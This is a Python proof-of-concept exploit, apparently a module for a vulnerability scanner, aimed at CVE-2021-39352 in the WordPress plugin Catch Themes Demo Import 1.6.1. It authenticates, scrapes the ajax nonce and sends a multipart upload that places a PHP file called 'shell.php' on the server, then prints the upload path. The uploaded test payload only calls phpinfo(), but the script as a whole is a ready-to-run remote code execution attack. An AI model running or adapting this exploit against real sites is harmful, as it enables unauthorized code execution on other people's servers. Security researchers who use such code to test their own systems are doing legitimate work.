# coding: utf-8
import requests
import datetime

#Wordpress Plugin Catch Themes Demo Import 1.6.1 - Remote Code Execution (RCE)
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    session = requests.Session()
    auth_url=url+'/wp-login.php'
    redirecto = url + "/wp-admin/"
    username=logindict.keys()
    password=logindict.values()
    header = {
        'User-Agent': user_agent
    }
    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': redirecto, 'testcookie': '1'}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        auth  = session.post(auth_url, headers=header, data=data, proxies=proxies)
    else:
        auth  = session.post(auth_url, headers=header, data=data)

    #漏洞位置
    exploit_url=url+'/wp-admin/admin-ajax.php'
    # Get Security nonce value:
    check = session.get(url+ '/wp-admin/themes.php?page=catch-themes-demo-import').text
    # print(check)
    nonce = check[check.find('ajax_nonce"') +13:]
    wp_nonce = nonce[:nonce.find('"')]
    if nonce.find('ajax_nonce"'):
        nonce = nonce[nonce.find('ajax_nonce"') + 13:]
        wp_nonce = nonce[:nonce.find('"')]
    header = {
        "User-Agent": user_agent,
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        'Referer': url + '/wp-admin/themes.php?page=catch-themes-demo-import',
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "multipart/form-data; boundary=---------------------------31646237283736025553843370623",
        "Connection": "close"
    }

    shell_payload='-----------------------------31646237283736025553843370623\nContent-Disposition: form-data; name="action"\n\nctdi_import_demo_data\n-----------------------------31646237283736025553843370623\nContent-Disposition: form-data; name="security"  \
    \n\n'+wp_nonce+'\n-----------------------------31646237283736025553843370623\nContent-Disposition: form-data; name="selected"\n\nundefined\n-----------------------------31646237283736025553843370623\nContent-Disposition: form-data; name="content_file"; filename="shell.php"\nContent-Type: application/octet-stream \
    \n\n<?php\n phpinfo(); \n?>\n\n-----------------------------31646237283736025553843370623\nContent-Disposition: form-data; name="widget_file"\n\nundefined\n-----------------------------31646237283736025553843370623\nContent-Disposition: form-data; name="customizer_file"\n\nundefined \
    \n-----------------------------31646237283736025553843370623--'
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = session.post(exploit_url, headers=header,data=shell_payload, proxies=proxies)
    else:
        response = session.post(exploit_url, headers=header,data=shell_payload)

    # print(url+'/wp-content/uploads/' + str(datetime.datetime.now().strftime('%Y')) + '/' + str(datetime.datetime.now().strftime('%m')) + '/shell.php')
    verification_url = url + '/wp-content/uploads/' + str(datetime.datetime.now().strftime('%Y')) + '/' + str(
        datetime.datetime.now().strftime('%m')) + '/shell.php'

    if response.status_code==200 and "afterAllImportAJAX" in response.text:
        return "Wordpress Plugin Catch Themes Demo Import 1.6.1 - 远程代码执行漏洞    漏洞编号：CVE-2021-39352\n    上传位置："+verification_url


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,logindict,user_agent,proxies)
        return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')

